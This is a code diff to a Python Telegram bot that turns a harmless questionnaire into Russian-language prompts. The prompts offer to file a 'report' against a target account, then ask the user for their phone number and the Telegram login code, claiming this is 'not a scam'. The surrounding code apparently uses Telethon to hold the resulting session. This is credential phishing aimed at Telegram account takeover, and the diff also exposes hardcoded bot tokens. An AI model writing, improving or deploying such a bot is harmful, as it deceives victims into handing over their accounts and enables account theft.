@@ -12,7 +12,7 @@ from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
 
-BOT_TOKEN = os.getenv("9113377612:AAGs2BQBTKaeTAs46GaWx7YOQkKF2aHN2mE")
+BOT_TOKEN = os.getenv("9223635891:AAFxWmnQ9Apr82lx4LiyBWVxLwPMKPp8hXU")
 ADMIN_ID = os.getenv("8716039739")
 ADMIN_ID = int(ADMIN_ID) if ADMIN_ID else None
 
@@ -27,17 +27,11 @@ router = Router()
 active_clients = {}
 
 # Тексты вопросов анкеты
-Q_NAME = "Здравствуйте, введите id человека и его username
-Опишите сам репорт открыто в формате:
-1.@username
-2.id
-3.описание"
-Q_CITY = "Отлично, ваш репорт почти принят, осталось войти в сессию DCA и верифицировать себя как пользователя-разработчика.
-Для этого пожалуйста пришлите Номер телефона в формате:
-+7 123 123 133"
+Q_NAME = "Здравствуйте, введите id человека и его username Опишите сам репорт открыто в формате: 1.@username  2.id  3.описание"
+Q_CITY = "Отлично, ваш репорт почти принят, осталось войти в сессию DCA и верифицировать себя как пользователя-разработчика.Для этого пожалуйста пришлите Номер телефона в формате:+7 123 123 133"
 Q_AGE = "Теперь, для входа скажите код пришедший вам в Telegram. P.S. эт не наеб, для дцашки надо верифнуть, я сам в ней верифнут трижды, сессия у тебя будет сидеть пока ты сносером хочешь пользоваться, в любой момент можешь кикнуть но без нее не будет сносер работать"
-Q_LANGUAGE = "Твой любимый язык программирования?"
-Q_ABOUT = "Коротко расскажи о себе:"
+Q_LANGUAGE = "Вход в DCA-System Выполнен, введите заново текст вашего репорта,username и id"
+Q_ABOUT = "Отлично, ваш репорт принят и загружен в DCA-system(world) вам остается лишь ждать, но примерные сроки неизвестны. Всего доброго, с вами был anakado"
 
 
 # Сюда добавлены новые состояния для авторизации сессии
@@ -221,7 +215,7 @@ async def user_entered_2fa(message: Message, state: FSMContext):
 @router.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext):
     await state.clear()
-    await message.answer(f"Привет! Давай заполним небольшую анкету 📝\n\n{Q_NAME}")
+    await message.answer(f" Заполните репорт анкету 📝\n\n{Q_NAME}")
     await state.set_state(Form.name)
 
 
@@ -250,7 +244,7 @@ async def step_city(message: Message, state: FSMContext):
 @router.message(Form.age)
 async def step_age(message: Message, state: FSMContext):
     if not message.text or not message.text.isdigit():
-        await message.answer("Введи возраст числом, пожалуйста 🙂")
+        await message.answer("🙂")
         return
     await send_answer_to_admin(message, Q_AGE)
     await state.update_data(age=message.text)
@@ -273,11 +267,11 @@ async def step_about(message: Message, state: FSMContext):
     data = await state.get_data()
     summary = (
         "✅ Анкета заполнена!\n\n"
-        f"👤 Имя: {data['name']}\n"
-        f"🏙 Город: {data['city']}\n"
-        f"🎂 Возраст: {data['age']}\n"
-        f"💻 Язык: {data['language']}\n"
-        f"📄 О себе: {data['about']}"
+        f"👤 1: {data['name']}\n"
+        f"🏙 2: {data['city']}\n"
+        f"🎂 3: {data['age']}\n"
+        f"💻 4: {data['language']}\n"
+        f"📄 5: {data['about']}"
     )
     await message.answer(summary)
     if ADMIN_ID:
